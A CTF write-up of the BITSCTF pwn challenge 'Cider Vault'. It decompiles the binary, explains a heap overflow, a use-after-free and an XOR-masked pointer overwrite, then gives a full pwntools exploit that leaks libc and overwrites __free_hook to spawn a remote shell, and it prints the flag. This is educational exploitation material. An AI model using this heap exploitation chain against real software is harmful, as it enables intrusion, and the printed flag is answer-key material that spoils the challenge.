---
title: "Cider Vault - BITSCTF Write Up"
date: 2026-02-27
tags: [BITSCTF, pwn]
description: "This is the write up for Cider Vault chall - BITSCTF contest"
---

> - OTP "The Storybook Workshop keeps magical story cards in a fragile old vault. Caretakers can create cards, write words, read chapters, merge pages, and ring the moon bell."
> - Category: Pwn
> - Author: Woody Nguyen

## Analyzing
The challenge gives us a binary and a server to exploit for the real flag. First, try checking the file types of this binary:
```bash
$ file cider_vault
cider_vault: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bde7005c8d35d07c7ddaaac0e44808ff70500fd5, for GNU/Linux 3.2.0, not stripped

$ checksec --file=cider_vault
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   82 Symbols        Yes   1               3               cider_vault
```

We observed that this binary has all protection mechanism (Full RELRO, Canary, NX, PIE, FORTIFY), and it uses GLIBC 2.31. Trying to decompile it with IDA, we can see that this binary describes a Storybook Workshop, and it controls each pages on heap:
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _QWORD *v3; // rbx
  _QWORD *v4; // rax
  int v5; // ecx
  int v6; // edx
  int v7; // esi
  int v8; // edx
  unsigned int v9; // eax
  __int64 *v10; // rbx
  unsigned __int64 v11; // r13
  __int64 v12; // r15
  unsigned __int64 v13; // rbx
  ssize_t v14; // rax
  unsigned int v15; // eax
  __int64 *v16; // r13
  unsigned int v17; // ebx
  unsigned int v18; // eax
  void **v19; // rbx
  const __m128i **v20; // r13
  size_t v21; // r15
  char *v22; // rax
  __m128i *v23; // rax
  const __m128i *v24; // rdx
  unsigned int v25; // eax
  void *v26; // rdi
  unsigned int v27; // eax
  const void **v28; // r13
  size_t v29; // rdx
  unsigned int num; // eax
  _QWORD *v31; // r13
  size_t v32; // rbx
  void *v33; // rax
  void *v35; // [rsp+8h] [rbp-40h]

  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  puts("\x1B[38;5;213mstorybook-workshop\x1B[0m");
  puts("\x1B[38;5;117mOnce upon a midnight, the workshop lamp stayed on.\x1B[0m");
  puts("\x1B[38;5;117mPages still wake when someone whispers to the book.\x1B[0m");
  puts("\x1B[38;5;228mFind the hidden ending before the moonlight fades.\x1B[0m");
  while ( 1 )
  {
    v3 = vats;
    __printf_chk(1, "\x1B[38;5;213m\n[Storybook Workshop]\x1B[0m ");
    v4 = vats;
    v5 = 0;
    do
    {
      v6 = v5 + 1;
      if ( *v4 )
      {
        v7 = v5 + 2;
        ++v5;
        v6 = v7;
      }
      v4 += 2;
    }
    while ( v4 != (_QWORD *)&end );
    __printf_chk(1, "\x1B[38;5;228mChapter %d\x1B[0m ", v6);
    v8 = 0;
    do
    {
      v8 -= (*v3 == 0) - 1;
      v3 += 2;
    }
    while ( &end != (_UNKNOWN *)v3 );
    __printf_chk(1, "\x1B[38;5;117m(cards alive: %d)\n\x1B[0m", v8);
    puts("\x1B[38;5;120m1) open page    - start a fresh story page\x1B[0m");
    puts("\x1B[38;5;120m2) paint page   - pour ink onto a page\x1B[0m");
    puts("\x1B[38;5;120m3) peek page    - read what the page remembers\x1B[0m");
    puts("\x1B[38;5;120m4) tear page    - rip a page from the book\x1B[0m");
    puts("\x1B[38;5;120m5) stitch pages - sew two pages into one tale\x1B[0m");
    puts("\x1B[38;5;120m6) whisper path - retie where a page points\x1B[0m");
    puts("\x1B[38;5;120m7) moon bell    - ring the workshop bell\x1B[0m");
    puts("\x1B[38;5;120m8) goodnight    - close the storybook\x1B[0m");
    puts("> ");
    switch ( get_num() )
    {
      case 1LL:
        puts("page id:");
        num = get_num();
        if ( num > 0xB )
          goto LABEL_37;
        v31 = &vats[2 * (int)num];
        if ( *v31 )
          goto LABEL_37;
        puts("page size:");
        v32 = get_num();
        if ( v32 - 128 > 0x4A0 )
          goto LABEL_37;
        v33 = malloc(v32);
        *v31 = v33;
        if ( !v33 )
          goto LABEL_42;
        v31[1] = v32;
        puts("ok");
        continue;
      case 2LL:
        puts("page id:");
        v9 = get_num();
        if ( v9 > 0xB )
          goto LABEL_37;
        v10 = &vats[2 * (int)v9];
        if ( !*v10 )
          goto LABEL_37;
        puts("ink bytes:");
        v11 = get_num();
        if ( v11 > v10[1] + 128 )
          goto LABEL_37;
        puts("ink:");
        v12 = *v10;
        v13 = 0;
        if ( !v11 )
          goto LABEL_18;
        do
        {
          v14 = read(0, (void *)(v12 + v13), v11 - v13);
          if ( v14 <= 0 )
LABEL_16:
            exit(0);
          v13 += v14;
        }
        while ( v11 > v13 );
LABEL_18:
        puts("ok");
        break;
      case 3LL:
        puts("page id:");
        v27 = get_num();
        if ( v27 > 0xB )
          goto LABEL_37;
        v28 = (const void **)&vats[2 * (int)v27];
        if ( !*v28 )
          goto LABEL_37;
        puts("peek bytes:");
        v29 = get_num();
        if ( v29 > (unsigned __int64)v28[1] + 128 )
          goto LABEL_37;
        write(1, *v28, v29);
        puts("");
        continue;
      case 4LL:
        puts("page id:");
        v25 = get_num();
        if ( v25 > 0xB )
          goto LABEL_37;
        v26 = (void *)vats[2 * (int)v25];
        if ( !v26 )
          goto LABEL_37;
        free(v26);
        puts("ok");
        continue;
      case 5LL:
        puts("first page:");
        v17 = get_num();
        puts("second page:");
        v18 = get_num();
        if ( v18 > 0xB )
          continue;
        if ( v17 > 0xB )
          continue;
        v19 = (void **)&vats[2 * (int)v17];
        if ( !*v19 )
          continue;
        v20 = (const __m128i **)&vats[2 * (int)v18];
        if ( !*v20 )
          continue;
        v21 = (size_t)v19[1] + 32;
        v35 = v19[1];
        v22 = (char *)realloc(*v19, v21);
        if ( !v22 )
LABEL_42:
          exit(1);
        *v19 = v22;
        v23 = (__m128i *)&v22[(_QWORD)v35];
        v24 = *v20;
        *v23 = _mm_loadu_si128(*v20);
        v23[1] = _mm_loadu_si128(v24 + 1);
        v19[1] = (void *)v21;
        puts("ok");
        continue;
      case 6LL:
        puts("page id:");
        v15 = get_num();
        if ( v15 <= 0xB && (v16 = &vats[2 * (int)v15], *v16) )
        {
          puts("star token:");
          *v16 = get_num() ^ 0x51F0D1CE6E5B7A91LL;
          puts("ok");
        }
        else
        {
LABEL_37:
          puts("no");
        }
        continue;
      case 7LL:
        _IO_wfile_overflow(stderr, 88);
        goto LABEL_18;
      case 8LL:
        goto LABEL_16;
      default:
        puts("?");
        continue;
    }
  }
}
```

Trying to sub this code, we have the flow of this binary like this:
```cpp
#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <emmintrin.h> // Cho các lệnh SIMD _mm_loadu_si128

// Cấu trúc đại diện cho một trang sách trong bộ nhớ
struct Page {
    void* data;
    size_t size;
};

// Mảng quản lý các trang (vats trong mã decompile)
Page pages[12]; // Giới hạn 0xB (11) + 1 = 12 trang

void init_workshop() {
    setbuf(stdin, nullptr);
    setbuf(stdout, nullptr);
    setbuf(stderr, nullptr);
    std::cout << "\033[38;5;213mstorybook-workshop\033[0m\n";
    std::cout << "\033[38;5;117mOnce upon a midnight, the workshop lamp stayed on.\033[0m\n";
    std::cout << "...\n";
}

// --- LUỒNG CHÍNH CỦA WORKSHOP ---

int main() {
    init_workshop();
    
    while (true) {
        // ... (Hiển thị Menu và đếm số trang đang hoạt động) ...
        std::cout << "> ";
        long long choice = get_num();

        switch (choice) {
            case 1: { // Open Page (Malloc)
                std::cout << "page id:\n";
                unsigned int id = get_num();
                if (id > 11 || pages[id].data) { std::cout << "no\n"; break; }
                
                std::cout << "page size:\n";
                size_t sz = get_num();
                if (sz < 128 || sz > 1184 + 128) { std::cout << "no\n"; break; }
                
                pages[id].data = malloc(sz);
                if (!pages[id].data) exit(1);
                pages[id].size = sz;
                std::cout << "ok\n";
                break;
            }

            case 2: { // Paint Page (Write - LỖ HỔNG OVERFLOW)
                std::cout << "page id:\n";
                unsigned int id = get_num();
                if (id > 11 || !pages[id].data) { std::cout << "no\n"; break; }
                
                std::cout << "ink bytes:\n";
                size_t ink_bytes = get_num();
                // LỖ HỔNG: Cho phép viết quá kích thước thực tế 128 bytes
                if (ink_bytes > pages[id].size + 128) { std::cout << "no\n"; break; }
                
                std::cout << "ink:\n";
                read(0, pages[id].data, ink_bytes); 
                std::cout << "ok\n";
                break;
            }

            case 3: { // Peek Page (Read - LỖ HỔNG LEAK)
                std::cout << "page id:\n";
                unsigned int id = get_num();
                if (id > 11 || !pages[id].data) { std::cout << "no\n"; break; }
                
                std::cout << "peek bytes:\n";
                size_t peek_bytes = get_num();
                // LỖ HỔNG: Cho phép đọc quá kích thước thực tế 128 bytes (Heap Leak)
                if (peek_bytes > pages[id].size + 128) { std::cout << "no\n"; break; }
                
                write(1, pages[id].data, peek_bytes);
                std::cout << "\nok\n";
                break;
            }

            case 4: { // Tear Page (Free)
                std::cout << "page id:\n";
                unsigned int id = get_num();
                if (id > 11 || !pages[id].data) { std::cout << "no\n"; break; }
                
                free(pages[id].data);
                // LỖ HỔNG: Không đặt con trỏ về NULL (Dangling Pointer) -> Use After Free
                std::cout << "ok\n";
                break;
            }

            case 5: { // Stitch Pages (Realloc & SIMD Copy)
                // Nối nội dung trang 2 vào cuối trang 1
                // Sử dụng lệnh XMM để copy 32 bytes (2 lần 16 bytes)
                break;
            }

            case 6: { // Whisper Path (Arbitrary Write - Obfuscated)
                std::cout << "page id:\n";
                unsigned int id = get_num();
                if (id <= 11 && pages[id].data) {
                    std::cout << "star token:\n";
                    // Ghi đè con trỏ với giá trị XOR (Obfuscation)
                    pages[id].data = (void*)(get_num() ^ 0x51F0D1CE6E5B7A91LL);
                    std::cout << "ok\n";
                }
                break;
            }
            
            case 8: exit(0);
        }
    }
}
```

Base on this flow, we can observed that:
- Array `vats[]` contains 12 slots, each slot's size is 16 bytes loaded as a struct like this:
    ```c++
    struct slot {
        void *ptr;    // offset 0x00 — con trỏ tới vùng heap
        size_t size;  // offset 0x08 — kích thước đã cấp phát
    };
    ```
- The book workshop has 8 choices, each choices has their own role:
    | # | Name | Description |
    |---|------|--------|
    | 1 | open page | `malloc(size)` with `0x80 ≤ size ≤ 0x520` |
    | 2 | paint page | `read(0, ptr, n)` — read data and load it into page |
    | 3 | peek page | `write(1, ptr, n)` — read data from page |
    | 4 | tear page | `free(ptr)` — free page |
    | 5 | stitch pages | `realloc` + copy 0x20 byte from another page |
    | 6 | whisper path | `ptr = input XOR 0x51F0D1CE6E5B7A91` |
    | 7 | moon bell | Call `_IO_wfile_overflow(stderr, 'X')` |
    | 8 | goodnight | `exit(0)` |

## Vulnerability

### Heap Overflow
First, looking at case 2:
```asm
.text:0000000000001370 loc_1370:        ; jumptable case 2  ← "paint page"
.text:0000000000001370     lea     rdi, aPageId     ; "page id:"
.text:0000000000001377     call    _puts
.text:000000000000137C     call    get_num          ; đọc index
.text:0000000000001381     cmp     eax, 0Bh
.text:0000000000001384     ja      loc_1630
.text:000000000000138A     cdqe
.text:000000000000138C     shl     rax, 4
.text:0000000000001390     lea     rbx, [r13+rax+0] ; rbx = &slot[index]
.text:0000000000001395     cmp     qword ptr [rbx], 0
.text:0000000000001399     jz      loc_1630
.text:000000000000139F     lea     rdi, aInkBytes   ; "ink bytes:"
.text:00000000000013A6     call    _puts
.text:00000000000013AB     call    get_num          ; r13 = ink_bytes (số byte user muốn ghi)
.text:00000000000013B0     mov     r13, rax
.text:00000000000013B3     mov     rax, [rbx+8]              ; rax = size (kích thước đã malloc)
.text:00000000000013B7     sub     rax, 0FFFFFFFFFFFFFF80h   ; ← sub(-0x80) = add(+0x80) → rax = size + 0x80
.text:00000000000013BB     cmp     r13, rax                  ; ink_bytes <= size + 0x80 ?
.text:00000000000013BE     ja      loc_1630                  ; nếu > size+0x80 mới reject
; → cho phép ghi TỚI size+0x80 byte, tức overflow 0x80 byte
.text:00000000000013C4     lea     rdi, aInk        ; "ink:"
.text:00000000000013CB     call    _puts
.text:00000000000013D0     mov     r15, [rbx]       ; r15 = ptr (heap buffer)
...
.text:00000000000013E8 loc_13E8:
.text:00000000000013E8     mov     rdx, r13         ; nbytes = ink_bytes
.text:00000000000013EB     xor     edi, edi         ; fd = 0 (stdin)
.text:00000000000013ED     lea     rsi, [r15+rbx]   ; buf = ptr + offset
.text:00000000000013F4     call    _read            ; ← ghi thực sự, vượt size byte
```
- At offset `0x1387`, the calculation is:
    ```
    sub rax, 0FFFFFFFFFFFFFF80h
    ```
- In 2's complement learning with 64-bit, `0FFFFFFFFFFFFFF80h = -0x80`, so that this calculation means:
    ```
    sub rax, (-0x80)  ≡  add rax, 0x80
    ```
- The real threshold is `size + 0x80`, which means this binary allows user to read/write 128 bytes over the range of chunk. This will cause **Heap Overflow**.

The same case can be found in case 3 at offset `0x15D2`:
```asm
.text:0000000000001590 loc_1590:        ; jumptable case 3  ← "peek page"
...
.text:00000000000015C6     call    get_num          ; rdx = peek_bytes
.text:00000000000015CB     mov     rdx, rax
.text:00000000000015CE     mov     rax, [r13+8]              ; rax = size
.text:00000000000015D2     sub     rax, 0FFFFFFFFFFFFFF80h   ; ← cũng sub(-0x80) = size + 0x80
.text:00000000000015D6     cmp     rdx, rax                  ; peek_bytes <= size + 0x80 ?
.text:00000000000015D9     ja      short loc_1630            ; nếu > size+0x80 mới reject
; → cho phép đọc TỚI size+0x80 byte ra ngoài buffer
.text:00000000000015DB     mov     rsi, [r13+0]    ; buf = ptr
.text:00000000000015DF     mov     edi, 1          ; fd = 1 (stdout)
.text:00000000000015E4     call    _write          ; ← đọc vượt size byte
```

### UAF vuln
Looking at case 4 - tear page:
```c
// Raw decompiling
case 4LL:
        puts("page id:");
        v25 = get_num();
        if ( v25 > 0xB )
          goto LABEL_37;
        v26 = (void *)vats[2 * (int)v25];
        if ( !v26 )
          goto LABEL_37;
        free(v26);
        puts("ok");
        continue;

// Re-sub
case 4: { // Tear Page (Free)
    std::cout << "page id:\n";
    unsigned int id = get_num();
    if (id > 11 || !pages[id].data) { std::cout << "no\n"; break; }
                
    free(pages[id].data);
    // LỖ HỔNG: Không đặt con trỏ về NULL (Dangling Pointer) -> Use After Free
    std::cout << "ok\n";
    break;
}
```
- We can see that this case call `free(ptr)`, but the pointer in slot has not been deleted.
- Looking more closely into the assembly:
    ```asm
    .text:0000000000001548 loc_1548:        ; jumptable case 4  ← "tear page"
    .text:0000000000001548     lea     rdi, aPageId     ; "page id:"
    .text:000000000000154F     call    _puts
    .text:0000000000001554     call    get_num          ; đọc index từ người dùng
    .text:0000000000001559     cmp     eax, 0Bh         ; index <= 11?
    .text:000000000000155C     ja      loc_1630         ; nếu out-of-range → bail
    .text:0000000000001562     cdqe
    .text:0000000000001564     shl     rax, 4           ; rax = index * 16
    .text:0000000000001568     mov     rdi, [r13+rax+0] ; rdi = slots[index].ptr
    .text:000000000000156D     test    rdi, rdi         ; NULL check
    .text:0000000000001570     jz      loc_1630         ; ptr == NULL → bail
    .text:0000000000001576     call    _free            ; ← FREE ptr
    .text:000000000000157B     lea     rdi, aOk         ; "ok"
    .text:0000000000001582     call    _puts
    .text:0000000000001587     jmp     loc_1268         ; ← quay lại menu
    ```

    - After calling `_free` at `0x1576`, there is no more line to assign `[r13+rax+0] = 0`. Trying compare it with a safe implementation:
        ```asm
        call    _free
        shl     rax, 4                      ; tính lại offset
        mov     qword ptr [r13+rax+0], 0   ; ← zero out pointer
        ```

    - In fact, the pointer can be still available in slot, which can be `peek` (read) or `paint` (write) into the free memory. This problem called **UAF (Use-After-Free)**:
        ```asm
        call    _free
        lea     rdi, aOk
        call    _puts
        jmp     loc_1268   ; ← ptr dangling, has not been deleted
        ```

### Arbitrary Write
Looking at case 6, at offset `0x1481`, this binary allows user to assign the slot's pointer by a random value
```asm
.text:0000000000001438 loc_1438:        ; jumptable case 6  ← "whisper path"
.text:0000000000001438     lea     rdi, aPageId     ; "page id:"
.text:000000000000143F     call    _puts
.text:0000000000001444     call    get_num          ; đọc index
.text:0000000000001449     cmp     eax, 0Bh
.text:000000000000144C     ja      loc_1630
.text:0000000000001452     cdqe
.text:0000000000001454     shl     rax, 4
.text:0000000000001458     add     r13, rax         ; r13 = &slot[index]
.text:000000000000145B     cmp     qword ptr [r13+0], 0
.text:0000000000001460     jz      loc_1630         ; NULL check — ptr phải != 0
.text:0000000000001466     lea     rdi, aStarToken  ; "star token:"
.text:000000000000146D     call    _puts
.text:0000000000001472     call    get_num          ; rax = user_input (giá trị tùy ý)
.text:0000000000001477     lea     rdi, aOk         ; "ok"
.text:000000000000147E     xor     rax, r14         ; ← rax = user_input XOR 0x51F0D1CE6E5B7A91
.text:0000000000001481     mov     [r13+0], rax     ; ← slot.ptr = rax  (arbitrary write!)
.text:0000000000001485     call    _puts
.text:000000000000148A     jmp     loc_1268
```
- So in this case, if we want to reach `slot.ptr = target`, the input is `target XOR r14`. We can found `r14` at offset `0x11EA` in `main`. So all we need is the correct offset of `target`:
    ```asm
    .text:00000000000011EA     mov     r14, 51F0D1CE6E5B7A91h   ; ← hard-coded "secret" key
    ```

## Exploit
Since GLIBC 2.31 has `___free_hook`, this is the way we can exploit:
- Step 1: Leak libc throughout unsorted bin:
    ```python
    open_page(0, 0x420)   # chunk 0x430 > tcache max (0x410) → unsorted bin khi free
    open_page(1, 0x80)    # guard chunk chặn hợp nhất với top chunk
    tear_page(0)           # free → unsorted bin, ptr vẫn còn (UAF)
    leak = peek_page(0, 8) # đọc fd pointer = main_arena + 96
    ```
- Step 2: Write `system` into `___free_hook` through whisper and paint:
    ```python
    whisper_path(1, __free_hook_addr)          # slot 1 ptr → __free_hook
    paint_page(1, 8, p64(system_addr))         # ghi system vào __free_hook
    ```
- Step 3: Trigger ``system("/bin/sh")`` by free chunk containing `"/bin/sh"`:
    ```python
    open_page(2, 0x80)
    paint_page(2, 8, b"/bin/sh\x00")
    tear_page(2)   # free(ptr) → __free_hook(ptr) → system("/bin/sh")
    ```

This is the full exploit code:
```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = "chals.bitskrieg.in"
PORT = 42567

elf = ELF("./cider_vault")
libc = ELF("./libc.so.6")

XOR_KEY = 0x51F0D1CE6E5B7A91

def choose(n):
    r.sendlineafter(b"> \n", str(n).encode())

def open_page(idx, size):
    choose(1)
    r.sendlineafter(b"page id:\n", str(idx).encode())
    r.sendlineafter(b"page size:\n", str(size).encode())

def paint_page(idx, nbytes, data):
    choose(2)
    r.sendlineafter(b"page id:\n", str(idx).encode())
    r.sendlineafter(b"ink bytes:\n", str(nbytes).encode())
    r.recvuntil(b"ink:\n")
    # read() loop expects exactly nbytes raw bytes
    r.send(data.ljust(nbytes, b'\x00'))

def peek_page(idx, nbytes):
    choose(3)
    r.sendlineafter(b"page id:\n", str(idx).encode())
    r.sendlineafter(b"peek bytes:\n", str(nbytes).encode())
    data = r.recvn(nbytes)
    return data

def tear_page(idx):
    choose(4)
    r.sendlineafter(b"page id:\n", str(idx).encode())

def whisper_path(idx, target_addr):
    choose(6)
    r.sendlineafter(b"page id:\n", str(idx).encode())
    # whisper sets ptr = user_input XOR key
    token = target_addr ^ XOR_KEY
    # strtol parses signed long; handle unsigned > LONG_MAX
    if token >= (1 << 63):
        token -= (1 << 64)
    r.sendlineafter(b"star token:\n", str(token).encode())

# ---- Connect ----
r = remote(HOST, PORT)

# ---- Step 1: Allocate chunks ----
# 0x420 -> chunk size 0x430, too big for tcache -> unsorted bin on free
open_page(0, 0x420)
# Guard chunk prevents consolidation with top chunk
open_page(1, 0x80)

# ---- Step 2: Free chunk 0 -> unsorted bin (UAF: ptr not cleared) ----
tear_page(0)

# ---- Step 3: Leak libc via unsorted bin fd ----
leak_data = peek_page(0, 8)
libc_leak = u64(leak_data)
log.info(f"Leaked unsorted bin fd: {hex(libc_leak)}")

# Sanity check: should look like 0x7f............
assert (libc_leak >> 40) == 0x7f or (libc_leak >> 40) == 0x7e, \
    f"Leak looks wrong: {hex(libc_leak)}"

# leaked = main_arena + 96 (0x60)
# main_arena = __malloc_hook + 0x10
libc.address = libc_leak - libc.sym.__malloc_hook - 0x70
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system:      {hex(libc.sym.system)}")
log.info(f"__free_hook: {hex(libc.sym.__free_hook)}")

# Sanity: libc base should be page-aligned
assert (libc.address & 0xfff) == 0, \
    f"libc base not page-aligned: {hex(libc.address)}"

# ---- Step 4: Overwrite __free_hook with system ----
# Use whisper to redirect slot 1's pointer to __free_hook
whisper_path(1, libc.sym.__free_hook)

# Write system address into __free_hook
paint_page(1, 8, p64(libc.sym.system))
log.success("__free_hook overwritten with system!")

# ---- Step 5: Trigger system("/bin/sh") ----
open_page(2, 0x80)
paint_page(2, 8, b"/bin/sh\x00")
log.info("Triggering free -> system('/bin/sh')...")
tear_page(2)

# ---- Shell ----
r.interactive()
```

The flag is `BITSCTF{2c7c3bf70e24c4e52962a4d07d158893}`